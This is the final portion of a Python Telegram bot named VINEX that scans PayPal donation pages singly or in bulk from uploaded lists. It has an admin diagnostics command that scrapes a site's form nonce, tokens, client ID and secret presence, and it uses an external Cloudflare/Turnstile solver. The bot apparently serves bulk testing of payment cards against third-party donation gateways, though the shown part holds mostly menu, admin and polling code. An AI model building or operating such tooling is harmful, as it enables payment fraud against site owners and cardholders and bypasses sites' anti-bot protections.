        safe_send_message(chat_id, f'⚠️ Crashed at {processed}/{total}\n♻️ /resume')
    finally:
        mass_active[uid] = False
        mass_pause[uid] = False

@bot.message_handler(commands=['diag'])
def cmd_diag(message):
    try:
        if str(message.from_user.id) not in ADMINS:
            safe_send_message(message.chat.id, '❌ Admin only.')
            return
        parts = message.text.split(maxsplit=1)
        if len(parts) < 2:
            safe_send_message(message.chat.id, 'Usage: <code>/diag URL</code>')
            return
        link = safe_url(parts[1].strip())
        if not link:
            safe_send_message(message.chat.id, '❌ Invalid link.')
            return
        msg = safe_send_message(message.chat.id, '🔬 Diagnosing...')
        if not msg: return
        tester = VinexTester(link)
        tester.Key()
        cf_info = '—'
        if tester.cf_detected:
            cf_info = '✅ Solved' if tester.cf_solved else '⚠️ Detected (solver disabled)'
        report = (
            f'[⚡] {SB("Diagnostics v23.0")}\n{vsep()}\n'
            f'{vt("URL", f"<code>{link[:80]}</code>")}\n'
            f'{vt("GW", f"<code>{tester.gateway_type}</code>")}\n'
            f'{vt("HTML", f"<code>{len(tester.page_html)}b</code>")}\n'
            f'{vt("Content", f"<code>{len(tester.all_content)}b</code>")}\n'
            f'{vt("Form", f"<code>{tester.id_form2 or chr(78)+chr(79)+chr(78)+chr(69)}</code>")}\n'
            f'{vt("Nonce", f"<code>{tester.nonce or chr(78)+chr(79)+chr(78)+chr(69)}</code>")}\n'
            f'{vt("Tokens", f"<code>{len(tester.token_candidates)}</code>")}\n'
            f'{vt("Verified", f"<code>{tester.token_verified}</code>")}\n'
            f'{vt("ClientID", f"<code>{(tester.client_id or chr(45))[:24]}</code>")}\n'
            f'{vt("Secret", f"<code>{chr(89)+chr(69)+chr(83) if tester.client_secret else chr(78)+chr(79)}</code>")}\n'
            f'{vt("Currency", f"<code>{tester.currency}</code>")}\n'
            f'{vt("Min", f"<code>{tester.minimum}</code>")}\n'
            f'{vt("Fields", f"<code>{len(tester.form_fields)}</code>")}\n'
            f'{vt("Auth", f"<code>{tester.auth_method}</code>")}\n'
            f'{vt("Prices", f"<code>{len(tester.price_levels)} levels</code>")}\n'
            f'{vt("CurPID", f"<code>{tester.current_price_id or chr(45)}</code>")}\n'
            f'{vt("Cloudflare", cf_info)}'
        )
        safe_edit_message(message.chat.id, msg.message_id, report)
    except Exception: log.exception('cmd_diag')

# ═══════════════════════════════════════════════════════════════
#  CALLBACKS
# ═══════════════════════════════════════════════════════════════
@bot.callback_query_handler(func=lambda c: c.data == 'stats')
def cb_stats(call):
    try: bot.answer_callback_query(call.id, '📊'); cmd_stats(call.message)
    except Exception: pass

@bot.callback_query_handler(func=lambda c: c.data == 'help')
def cb_help(call):
    try: bot.answer_callback_query(call.id); cmd_help(call.message)
    except Exception: pass

@bot.callback_query_handler(func=lambda c: c.data == 'stop')
def cb_stop(call):
    try: bot.answer_callback_query(call.id, '🛑'); cmd_stop(call.message)
    except Exception: pass

@bot.callback_query_handler(func=lambda c: c.data == 'luck')
def cb_luck(call):
    try: bot.answer_callback_query(call.id, '🎲'); cmd_luck(call.message)
    except Exception: pass

@bot.callback_query_handler(func=lambda c: c.data == 'howto_paypal')
def cb_howto_paypal(call):
    try:
        bot.answer_callback_query(call.id, '💡')
        safe_send_message(call.message.chat.id,
            f'[⚡] {SB("Ready")}\n\nType:\n<code>/paypal https://your-site.com/donate</code>',
            effect=EFFECT_HEART)
    except Exception: pass

@bot.callback_query_handler(func=lambda c: c.data == 'howto_mass')
def cb_howto_mass(call):
    try:
        bot.answer_callback_query(call.id, '📦')
        safe_send_message(call.message.chat.id,
            f'[⚡] {SB("Bulk Mode")}\n\n1. /mass\n2. Upload .txt\n3. Watch 🚀',
            effect=EFFECT_THUMBS)
    except Exception: pass

@bot.callback_query_handler(func=lambda c: c.data == 'emojis')
def cb_emojis(call):
    try:
        bot.answer_callback_query(call.id, '🎨')
        groups = {
            'Money': ['cash', 'moneybag', 'moneywings', 'money2'],
            'Status': ['warn', 'stop', 'ban', 'shield', 'blue_bolt', 'rocket'],
            'Fun': ['party', 'gift', 'laugh', 'smile', 'scream', 'grimace'],
            'UI': ['play', 'pause', 'record', 'sound', 'gear', 'circle'],
            'Misc': ['shop', 'soon', 'globe'],
        }
        lines = [f'[⚡] {B(g)}:\n' + ' '.join(ve(k) for k in keys)
                 for g, keys in groups.items()]
        text = (f'[⚡] {SB("Vinex Emoji Pack")} {ve("party")}\n{vsep()}\n'
                + '\n\n'.join(lines) +
                f'\n{vsep()}\n{vt("Count", f"<code>{len(VINEX_CE)}</code>")}')
        kb = types.InlineKeyboardMarkup()
        kb.add(vinex_btn('Back', 'primary', 'play', callback_data='back_start'))
        safe_send_message(call.message.chat.id, text, reply_markup=kb, effect=EFFECT_FIRE)
    except Exception: log.exception('cb_emojis')

@bot.callback_query_handler(func=lambda c: c.data == 'back_start')
def cb_back_start(call):
    try:
        bot.answer_callback_query(call.id)
        try: bot.delete_message(call.message.chat.id, call.message.message_id)
        except Exception: pass
        cmd_start(call.message)
    except Exception: pass

@bot.callback_query_handler(func=lambda c: c.data == 'yrr')
def cb_feedback(call):
    try:
        bot.answer_callback_query(call.id)
        uid = call.from_user.id
        kb = types.InlineKeyboardMarkup()
        kb.add(vinex_btn('Back', 'primary', callback_data='back_start'))
        try:
            bot.edit_message_text(chat_id=call.message.chat.id,
                message_id=call.message.message_id,
                text='✍️ Send your message:', parse_mode='HTML', reply_markup=kb)
        except Exception: pass
        waiting_users[uid] = True
    except Exception: pass

@bot.message_handler(func=lambda m: m.from_user.id in waiting_users)
def handle_user_msg(message):
    try:
        uid = message.from_user.id
        text = message.text or '(non-text)'
        kb = types.InlineKeyboardMarkup()
        kb.add(vinex_btn('Reply', 'success', callback_data=f'reply_{uid}'))
        safe_send_message(OWNER_ID,
            f'📩 New Message\n👤 {message.from_user.first_name}\n'
            f'🆔 <code>{uid}</code>\n💬 {text}', reply_markup=kb)
        safe_send_message(uid, '✅ Sent.')
        waiting_users.pop(uid, None)
    except Exception: pass

@bot.callback_query_handler(func=lambda c: c.data.startswith('reply_'))
def cb_reply(call):
    try:
        target = int(call.data.split('_', 1)[1])
        reply_mode[call.from_user.id] = target
        safe_send_message(call.from_user.id, '✍️ Reply:')
    except Exception: pass

@bot.message_handler(func=lambda m: m.from_user.id == OWNER_ID and m.from_user.id in reply_mode)
def handle_admin_reply(message):
    try:
        target = reply_mode[message.from_user.id]
        safe_send_message(target, f'💬 <b>Admin:</b>\n\n{message.text or ""}')
        safe_send_message(OWNER_ID, '✅ Sent.')
        reply_mode.pop(message.from_user.id, None)
    except Exception: pass

# ═══════════════════════════════════════════════════════════════
#  ADMIN
# ═══════════════════════════════════════════════════════════════
@bot.message_handler(commands=['block2'])
def admin_block(message):
    try:
        if str(message.from_user.id) not in ADMINS: return
        parts = message.text.split()
        if len(parts) < 2 or not parts[1].isdigit(): return
        uid = parts[1].strip()
        if uid in open(BLOCK_FILE).read().splitlines():
            safe_send_message(message.chat.id, '⚠️ Already blocked.')
            return
        with open(BLOCK_FILE, 'a') as f: f.write(f'{uid}\n')
        safe_send_message(message.chat.id, f'✅ Blocked <code>{uid}</code>')
    except Exception: pass

@bot.message_handler(commands=['unblock2'])
def admin_unblock(message):
    try:
        if str(message.from_user.id) not in ADMINS: return
        parts = message.text.split()
        if len(parts) < 2 or not parts[1].isdigit(): return
        uid = parts[1].strip()
        lines = open(BLOCK_FILE).readlines()
        with open(BLOCK_FILE, 'w') as f:
            for l in lines:
                if l.strip() != uid: f.write(l)
        safe_send_message(message.chat.id, f'✅ Unblocked <code>{uid}</code>')
    except Exception: pass

@bot.message_handler(commands=['blocklist'])
def admin_blocklist(message):
    try:
        if str(message.from_user.id) not in ADMINS: return
        blocked = [l.strip() for l in open(BLOCK_FILE).read().splitlines() if l.strip()]
        if not blocked:
            safe_send_message(message.chat.id, '📋 Empty.')
            return
        text = '📋 <b>Blocked:</b>\n'
        for i, u in enumerate(blocked, 1):
            text += f'{i}. <code>{u}</code>\n'
        safe_send_message(message.chat.id, text)
    except Exception: pass

@bot.message_handler(commands=['broadcast'])
def admin_broadcast(message):
    try:
        if str(message.from_user.id) not in ADMINS: return
        parts = message.text.split(maxsplit=1)
        if len(parts) < 2: return
        txt = parts[1]
        users = [l.strip() for l in open(USERS_FILE).read().splitlines() if l.strip()]
        sent = 0; failed = 0
        for u in users:
            try:
                if safe_send_message(int(u), txt): sent += 1
                else: failed += 1
                time.sleep(0.05)
            except Exception: failed += 1
        safe_send_message(message.chat.id, f'📢 Done. ✅{sent} ❌{failed}')
    except Exception: pass

# ═══════════════════════════════════════════════════════════════
#  SETUP + MAIN
# ═══════════════════════════════════════════════════════════════
def vinex_setup():
    try:
        bot.set_my_commands([
            types.BotCommand('start', '🌟 Menu'),
            types.BotCommand('paypal', '⚡ Single scan'),
            types.BotCommand('mass', '📦 Bulk scan'),
            types.BotCommand('resume', '♻️ Resume'),
            types.BotCommand('stop', '🛑 Stop'),
            types.BotCommand('stats', '📊 Stats'),
            types.BotCommand('luck', '🎲 Roll dice'),
            types.BotCommand('mood', '🎭 Random emoji'),
            types.BotCommand('diag', '🔬 Diagnostics'),
            types.BotCommand('help', '💡 Guide'),
            types.BotCommand('ping', '🏓 Health'),
        ])
    except Exception as e: log.warning(f'commands: {e}')
    try:
        bot.set_chat_menu_button(menu_button=types.MenuButtonCommands(type='commands'))
    except Exception: pass

if __name__ == '__main__':
    log.info('VINEX v23.0 FINAL starting...')
    print(r'''
    __  ___  _  __ ______ _  __
   / / / _ \/ |/ // __/ / |/ /
  / /_/ // /    // _/ /    /
 /___/_//_/_/|_/___/_/_/|_/
    v23.0 FINAL — Multi-Tier + Final-State
    ''')
    try: cleanup_old_files()
    except Exception: pass
    vinex_setup()
    if _turnstile.enabled:
        log.info(f'Turnstile solver enabled: {TS_API_URL}')
    else:
        log.info('Turnstile solver disabled (TS_API_URL/TS_API_KEY not set)')
    while True:
        try:
            log.info('Polling loop starting...')
            bot.infinity_polling(timeout=60, long_polling_timeout=60,
                                  skip_pending=True, logger_level=logging.WARNING)
        except KeyboardInterrupt:
            log.info('Manual shutdown.')
            break
        except Exception as e:
            err = str(e).lower()
            log.error(f'Polling crash: {str(e)[:200]}')
            if '429' in err or 'too many' in err:
                try: wait = int(err.split('retry after ')[1].split()[0])
                except Exception: wait = 30
                time.sleep(wait)
            elif '502' in err or 'bad gateway' in err:
                time.sleep(20)
            else:
                time.sleep(15)
